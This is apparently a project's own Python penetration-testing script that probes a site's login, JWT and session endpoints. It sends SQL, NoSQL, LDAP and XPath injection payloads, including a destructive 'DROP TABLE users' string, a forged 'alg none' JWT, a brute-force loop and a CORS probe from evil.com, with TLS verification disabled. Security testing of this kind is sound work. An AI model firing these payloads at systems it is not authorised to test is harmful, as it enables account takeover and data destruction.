#!/usr/bin/env python3
"""
Authentication Endpoint Penetration Testing
==========================================

This script performs focused penetration testing on authentication endpoints
to identify specific vulnerabilities and security weaknesses.
"""

import requests
import json
import time
import base64
import hashlib
import hmac
from datetime import datetime, timedelta
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AuthEndpointPenetrationTester:
    """Focused penetration testing for authentication endpoints."""
    
    def __init__(self, base_url="https://aiwfe.com"):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        requests.packages.urllib3.disable_warnings()
        
        self.endpoints = {
            'login': '/api/v1/auth/jwt/login',
            'register': '/api/v1/auth/register', 
            'refresh': '/api/v1/auth/refresh',
            'profile': '/api/v1/auth/profile',
            'csrf': '/api/v1/auth/csrf-token',
            'logout': '/api/v1/auth/logout'
        }
        
        self.vulnerabilities = []
        
    def run_penetration_tests(self):
        """Execute comprehensive penetration tests."""
        logger.info("🔓 STARTING AUTHENTICATION ENDPOINT PENETRATION TESTING")
        logger.info("=" * 70)
        
        test_categories = [
            ("Authentication Bypass", self.test_authentication_bypass),
            ("Injection Vulnerabilities", self.test_injection_vulnerabilities),
            ("Session Management", self.test_session_management), 
            ("Rate Limiting", self.test_rate_limiting),
            ("Information Disclosure", self.test_information_disclosure),
            ("Token Security", self.test_token_security),
            ("Protocol Vulnerabilities", self.test_protocol_vulnerabilities)
        ]
        
        for category, test_method in test_categories:
            logger.info(f"\n🎯 Testing: {category}")
            logger.info("-" * 50)
            try:
                test_method()
            except Exception as e:
                logger.error(f"❌ Test category '{category}' failed: {e}")
                
        self.generate_penetration_report()
        
    def test_authentication_bypass(self):
        """Test authentication bypass vulnerabilities."""
        logger.info("Testing authentication bypass attacks...")
        
        # Test 1: SQL Injection in login
        sql_payloads = [
            {"email": "admin'--", "password": "anything"},
            {"email": "' OR '1'='1'--", "password": "password"},
            {"email": "admin'; DROP TABLE users; --", "password": "password"},
            {"email": "' UNION SELECT password FROM users WHERE email='admin'--", "password": "password"},
            {"email": "admin'/*", "password": "password"},
        ]
        
        for payload in sql_payloads:
            try:
                response = self.session.post(f"{self.base_url}{self.endpoints['login']}", json=payload)
                
                if response.status_code == 200:
                    self.vulnerabilities.append({
                        'severity': 'CRITICAL',
                        'category': 'SQL Injection',
                        'endpoint': self.endpoints['login'],
                        'description': f"Successful SQL injection bypass with payload: {payload['email']}",
                        'evidence': response.text[:200]
                    })
                    logger.error(f"🚨 CRITICAL: SQL injection successful with {payload['email']}")
                    
                # Check for SQL error disclosure
                sql_errors = ['sql', 'mysql', 'postgresql', 'oracle', 'syntax error', 'database']
                if any(error in response.text.lower() for error in sql_errors):
                    self.vulnerabilities.append({
                        'severity': 'HIGH',
                        'category': 'Information Disclosure',
                        'endpoint': self.endpoints['login'],
                        'description': f"SQL error information disclosed with payload: {payload['email']}",
                        'evidence': response.text[:200]
                    })
                    
            except Exception as e:
                logger.error(f"Error testing SQL injection: {e}")
                
        # Test 2: NoSQL Injection
        nosql_payloads = [
            {"email": {"$ne": ""}, "password": {"$ne": ""}},
            {"email": {"$gt": ""}, "password": {"$gt": ""}},
            {"email": {"$regex": ".*"}, "password": {"$regex": ".*"}},
            {"email": "admin", "password": {"$ne": "invalid"}},
        ]
        
        for payload in nosql_payloads:
            try:
                response = self.session.post(f"{self.base_url}{self.endpoints['login']}", json=payload)
                
                if response.status_code == 200 and 'token' in response.text:
                    self.vulnerabilities.append({
                        'severity': 'CRITICAL',
                        'category': 'NoSQL Injection',
                        'endpoint': self.endpoints['login'],
                        'description': f"Successful NoSQL injection bypass with payload: {str(payload)[:100]}",
                        'evidence': response.text[:200]
                    })
                    logger.error(f"🚨 CRITICAL: NoSQL injection successful")
                    
            except Exception as e:
                logger.debug(f"NoSQL injection test error (expected): {e}")
                
        # Test 3: JWT Manipulation
        fake_tokens = [
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.",  # None algorithm
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIiwiZW1haWwiOiJhZG1pbkBleGFtcGxlLmNvbSIsImV4cCI6OTk5OTk5OTk5OX0.invalid",  # Invalid signature
            "Bearer fake.jwt.token",  # Completely fake
        ]
        
        for token in fake_tokens:
            try:
                headers = {'Authorization': f'Bearer {token}'}
                response = self.session.get(f"{self.base_url}{self.endpoints['profile']}", headers=headers)
                
                if response.status_code == 200:
                    self.vulnerabilities.append({
                        'severity': 'CRITICAL',
                        'category': 'JWT Bypass',
                        'endpoint': self.endpoints['profile'],
                        'description': f"Fake JWT token accepted: {token[:30]}...",
                        'evidence': response.text[:200]
                    })
                    logger.error(f"🚨 CRITICAL: Fake JWT accepted")
                    
            except Exception as e:
                logger.debug(f"JWT manipulation test error (expected): {e}")
                
    def test_injection_vulnerabilities(self):
        """Test various injection vulnerabilities."""
        logger.info("Testing injection vulnerabilities...")
        
        # Test LDAP Injection
        ldap_payloads = [
            "admin*)(",
            "admin)(&(password=*))",
            "*)(uid=*",
            "admin)(|(password=*))",
        ]
        
        for payload in ldap_payloads:
            try:
                data = {"email": payload, "password": "password"}
                response = self.session.post(f"{self.base_url}{self.endpoints['login']}", json=data)
                
                if response.status_code == 200 and 'token' in response.text:
                    self.vulnerabilities.append({
                        'severity': 'HIGH',
                        'category': 'LDAP Injection',
                        'endpoint': self.endpoints['login'],
                        'description': f"Potential LDAP injection with payload: {payload}",
                        'evidence': response.text[:200]
                    })
                    
            except Exception as e:
                logger.debug(f"LDAP injection test error: {e}")
                
        # Test XPath Injection
        xpath_payloads = [
            "admin' or '1'='1",
            "') or '1'='1",
            "admin']/user[position()=1 and @name='admin']/password%00",
        ]
        
        for payload in xpath_payloads:
            try:
                data = {"email": payload, "password": "password"}
                response = self.session.post(f"{self.base_url}{self.endpoints['login']}", json=data)
                
                if response.status_code == 200 and 'token' in response.text:
                    self.vulnerabilities.append({
                        'severity': 'HIGH',
                        'category': 'XPath Injection',
                        'endpoint': self.endpoints['login'],
                        'description': f"Potential XPath injection with payload: {payload}",
                        'evidence': response.text[:200]
                    })
                    
            except Exception as e:
                logger.debug(f"XPath injection test error: {e}")
                
    def test_session_management(self):
        """Test session management vulnerabilities."""
        logger.info("Testing session management...")
        
        # Test session fixation
        try:
            # Get initial session
            response1 = self.session.get(f"{self.base_url}{self.endpoints['csrf']}")
            initial_cookies = dict(self.session.cookies)
            
            # Attempt login
            login_data = {"email": "test@example.com", "password": "password"}
            response2 = self.session.post(f"{self.base_url}{self.endpoints['login']}", json=login_data)
            
            # Check if session changed after login
            final_cookies = dict(self.session.cookies)
            
            if initial_cookies == final_cookies and response2.status_code == 200:
                self.vulnerabilities.append({
                    'severity': 'MEDIUM',
                    'category': 'Session Fixation',
                    'endpoint': self.endpoints['login'],
                    'description': "Session ID not changed after successful authentication",
                    'evidence': f"Initial cookies: {initial_cookies}, Final cookies: {final_cookies}"
                })
                logger.warning("⚠️ Session fixation vulnerability detected")
                
        except Exception as e:
            logger.debug(f"Session management test error: {e}")
            
        # Test concurrent session handling
        try:
            session1 = requests.Session()
            session1.verify = False
            session2 = requests.Session() 
            session2.verify = False
            
            # Simulate login from two different sessions with same credentials
            login_data = {"email": "test@example.com", "password": "password"}
            
            resp1 = session1.post(f"{self.base_url}{self.endpoints['login']}", json=login_data)
            resp2 = session2.post(f"{self.base_url}{self.endpoints['login']}", json=login_data)
            
            # Both sessions should be valid (this might be acceptable depending on requirements)
            if resp1.status_code == 200 and resp2.status_code == 200:
                logger.info("ℹ️ Concurrent sessions allowed (may be by design)")
                
        except Exception as e:
            logger.debug(f"Concurrent session test error: {e}")
            
    def test_rate_limiting(self):
        """Test rate limiting mechanisms."""
        logger.info("Testing rate limiting...")
        
        # Test brute force protection
        failed_attempts = 0
        rate_limited = False
        
        for i in range(10):
            try:
                login_data = {"email": "test@example.com", "password": f"wrong_password_{i}"}
                response = self.session.post(f"{self.base_url}{self.endpoints['login']}", json=login_data)
                
                if response.status_code == 429:  # Too Many Requests
                    rate_limited = True
                    logger.info(f"✅ Rate limiting triggered after {i+1} attempts")
                    break
                elif response.status_code == 403:
                    failed_attempts += 1
                    
                time.sleep(0.1)  # Small delay between attempts
                
            except Exception as e:
                logger.debug(f"Rate limiting test error: {e}")
                
        if not rate_limited and failed_attempts < 5:
            self.vulnerabilities.append({
                'severity': 'MEDIUM',
                'category': 'Insufficient Rate Limiting',
                'endpoint': self.endpoints['login'],
                'description': f"No rate limiting detected after {failed_attempts} failed attempts",
                'evidence': f"Successfully made 10 requests without being rate limited"
            })
            logger.warning("⚠️ Insufficient brute force protection")
            
    def test_information_disclosure(self):
        """Test for information disclosure vulnerabilities."""
        logger.info("Testing information disclosure...")
        
        # Test user enumeration
        test_emails = [
            "nonexistent@example.com",
            "admin@example.com", 
            "test@example.com",
            "user@example.com"
        ]
        
        response_patterns = {}
        
        for email in test_emails:
            try:
                login_data = {"email": email, "password": "wrong_password"}
                response = self.session.post(f"{self.base_url}{self.endpoints['login']}", json=login_data)
                
                # Analyze response patterns
                pattern_key = f"{response.status_code}:{len(response.text)}:{hash(response.text)}"
                
                if pattern_key not in response_patterns:
                    response_patterns[pattern_key] = []
                response_patterns[pattern_key].append(email)
                
            except Exception as e:
                logger.debug(f"User enumeration test error: {e}")
                
        # Check if different response patterns indicate user enumeration
        if len(response_patterns) > 1:
            self.vulnerabilities.append({
                'severity': 'LOW',
                'category': 'User Enumeration',
                'endpoint': self.endpoints['login'],
                'description': "Different response patterns may allow user enumeration",
                'evidence': f"Response patterns: {response_patterns}"
            })
            logger.warning("⚠️ Potential user enumeration vulnerability")
            
        # Test error message disclosure
        malformed_requests = [
            {},  # Empty request
            {"email": ""},  # Empty email
            {"password": ""},  # Empty password
            {"email": "invalid-email"},  # Invalid email format
            {"extra_field": "value"},  # Unexpected field
        ]
        
        for request_data in malformed_requests:
            try:
                response = self.session.post(f"{self.base_url}{self.endpoints['login']}", json=request_data)
                
                # Check for verbose error messages
                error_indicators = [
                    'stack trace', 'exception', 'traceback', 'debug', 
                    'internal server error', 'database', 'sql'
                ]
                
                if any(indicator in response.text.lower() for indicator in error_indicators):
                    self.vulnerabilities.append({
                        'severity': 'LOW',
                        'category': 'Information Disclosure',
                        'endpoint': self.endpoints['login'],
                        'description': f"Verbose error message with request: {request_data}",
                        'evidence': response.text[:300]
                    })
                    
            except Exception as e:
                logger.debug(f"Error message test error: {e}")
                
    def test_token_security(self):
        """Test JWT token security."""
        logger.info("Testing JWT token security...")
        
        # Test token entropy
        try:
            response = self.session.get(f"{self.base_url}{self.endpoints['csrf']}")
            csrf_token = response.headers.get('X-CSRF-TOKEN')
            
            if csrf_token:
                # Basic entropy check
                if len(set(csrf_token)) < 10:  # Very basic entropy check
                    self.vulnerabilities.append({
                        'severity': 'MEDIUM',
                        'category': 'Weak Token Generation',
                        'endpoint': self.endpoints['csrf'],
                        'description': "CSRF token may have insufficient entropy",
                        'evidence': f"Token: {csrf_token[:20]}... (unique chars: {len(set(csrf_token))})"
                    })
                    
        except Exception as e:
            logger.debug(f"Token entropy test error: {e}")
            
        # Test token storage
        try:
            response = self.session.get(f"{self.base_url}{self.endpoints['csrf']}")
            
            # Check if tokens are in cookies without HttpOnly flag
            for cookie in self.session.cookies:
                if 'token' in cookie.name.lower() and not cookie.has_nonstandard_attr('HttpOnly'):
                    self.vulnerabilities.append({
                        'severity': 'LOW',
                        'category': 'Insecure Cookie',
                        'endpoint': 'Cookie Security',
                        'description': f"Token cookie '{cookie.name}' lacks HttpOnly flag",
                        'evidence': f"Cookie: {cookie.name}={cookie.value[:20]}..."
                    })
                    
        except Exception as e:
            logger.debug(f"Token storage test error: {e}")
            
    def test_protocol_vulnerabilities(self):
        """Test protocol-specific vulnerabilities."""
        logger.info("Testing protocol vulnerabilities...")
        
        # Test HTTP verb tampering
        methods = ['GET', 'PUT', 'DELETE', 'PATCH', 'HEAD']
        
        for method in methods:
            try:
                response = self.session.request(method, f"{self.base_url}{self.endpoints['login']}")
                
                if response.status_code == 200:
                    self.vulnerabilities.append({
                        'severity': 'MEDIUM',
                        'category': 'HTTP Verb Tampering',
                        'endpoint': self.endpoints['login'],
                        'description': f"Login endpoint accepts {method} method",
                        'evidence': f"Response status: {response.status_code}"
                    })
                    logger.warning(f"⚠️ Login endpoint accepts {method}")
                    
            except Exception as e:
                logger.debug(f"HTTP verb test error: {e}")
                
        # Test CORS configuration
        try:
            headers = {
                'Origin': 'https://evil.com',
                'Access-Control-Request-Method': 'POST',
                'Access-Control-Request-Headers': 'Content-Type'
            }
            
            response = self.session.options(f"{self.base_url}{self.endpoints['login']}", headers=headers)
            
            cors_headers = {
                'Access-Control-Allow-Origin': response.headers.get('Access-Control-Allow-Origin'),
                'Access-Control-Allow-Credentials': response.headers.get('Access-Control-Allow-Credentials'),
                'Access-Control-Allow-Methods': response.headers.get('Access-Control-Allow-Methods')
            }
            
            if cors_headers['Access-Control-Allow-Origin'] == '*':
                self.vulnerabilities.append({
                    'severity': 'MEDIUM',
                    'category': 'CORS Misconfiguration',
                    'endpoint': self.endpoints['login'],
                    'description': "Overly permissive CORS policy allows any origin",
                    'evidence': f"CORS headers: {cors_headers}"
                })
                logger.warning("⚠️ Permissive CORS configuration detected")
                
        except Exception as e:
            logger.debug(f"CORS test error: {e}")
            
    def generate_penetration_report(self):
        """Generate comprehensive penetration testing report."""
        logger.info("\n" + "=" * 70)
        logger.info("🔓 AUTHENTICATION ENDPOINT PENETRATION TEST REPORT")
        logger.info("=" * 70)
        
        # Sort vulnerabilities by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        self.vulnerabilities.sort(key=lambda x: severity_order.get(x['severity'], 4))
        
        # Count vulnerabilities by severity
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        for vuln in self.vulnerabilities:
            severity_counts[vuln['severity']] += 1
            
        # Overall assessment
        total_vulns = len(self.vulnerabilities)
        critical_high = severity_counts['CRITICAL'] + severity_counts['HIGH']
        
        logger.info(f"\n📊 VULNERABILITY SUMMARY:")
        logger.info(f"   Total Vulnerabilities: {total_vulns}")
        logger.info(f"   🚨 Critical: {severity_counts['CRITICAL']}")
        logger.info(f"   ⚠️ High: {severity_counts['HIGH']}")
        logger.info(f"   🟡 Medium: {severity_counts['MEDIUM']}")
        logger.info(f"   ℹ️ Low: {severity_counts['LOW']}")
        
        # Risk assessment
        if severity_counts['CRITICAL'] > 0:
            risk_level = "🚨 CRITICAL RISK"
        elif severity_counts['HIGH'] > 0:
            risk_level = "⚠️ HIGH RISK"
        elif severity_counts['MEDIUM'] > 0:
            risk_level = "🟡 MEDIUM RISK"
        elif severity_counts['LOW'] > 0:
            risk_level = "ℹ️ LOW RISK"
        else:
            risk_level = "✅ MINIMAL RISK"
            
        logger.info(f"\n🎯 OVERALL RISK LEVEL: {risk_level}")
        
        # Detailed vulnerability report
        if self.vulnerabilities:
            logger.info(f"\n🔍 DETAILED VULNERABILITIES:")
            logger.info("-" * 50)
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                severity_icon = {
                    'CRITICAL': '🚨',
                    'HIGH': '⚠️',
                    'MEDIUM': '🟡', 
                    'LOW': 'ℹ️'
                }.get(vuln['severity'], '❓')
                
                logger.info(f"{i}. {severity_icon} {vuln['severity']} - {vuln['category']}")
                logger.info(f"   Endpoint: {vuln['endpoint']}")
                logger.info(f"   Description: {vuln['description']}")
                if 'evidence' in vuln:
                    logger.info(f"   Evidence: {vuln['evidence'][:100]}...")
                logger.info("")
                
        else:
            logger.info("\n✅ No significant vulnerabilities detected!")
            
        # Recommendations
        logger.info("🛡️ SECURITY RECOMMENDATIONS:")
        logger.info("-" * 50)
        
        recommendations = []
        
        if severity_counts['CRITICAL'] > 0:
            recommendations.append("🚨 IMMEDIATE: Address all critical vulnerabilities immediately")
            recommendations.append("🚨 Deploy emergency security patches")
            
        if severity_counts['HIGH'] > 0:
            recommendations.append("⚠️ HIGH PRIORITY: Fix high-severity vulnerabilities within 24-48 hours")
            
        if any(vuln['category'] == 'SQL Injection' for vuln in self.vulnerabilities):
            recommendations.append("🛡️ Implement parameterized queries and input validation")
            
        if any(vuln['category'] == 'JWT Bypass' for vuln in self.vulnerabilities):
            recommendations.append("🔐 Review JWT implementation and signature validation")
            
        if any(vuln['category'] in ['Rate Limiting', 'Brute Force'] for vuln in self.vulnerabilities):
            recommendations.append("🚦 Implement proper rate limiting and account lockout policies")
            
        recommendations.extend([
            "🔍 Conduct regular security audits and penetration testing",
            "📚 Train development team on secure coding practices",
            "🏗️ Implement security controls in CI/CD pipeline",
            "📊 Set up security monitoring and alerting"
        ])
        
        for rec in recommendations:
            logger.info(f"   {rec}")
            
        # Save report
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_file = f"/home/marku/ai_workflow_engine/penetration_test_report_{timestamp}.json"
        
        report_data = {
            'timestamp': datetime.now().isoformat(),
            'target': self.base_url,
            'vulnerability_summary': severity_counts,
            'risk_level': risk_level,
            'total_vulnerabilities': total_vulns,
            'vulnerabilities': self.vulnerabilities,
            'recommendations': recommendations
        }
        
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2, default=str)
            
        logger.info(f"\n📄 Detailed report saved to: {report_file}")
        logger.info("=" * 70)

def main():
    """Main execution function."""
    tester = AuthEndpointPenetrationTester()
    tester.run_penetration_tests()

if __name__ == "__main__":
    main()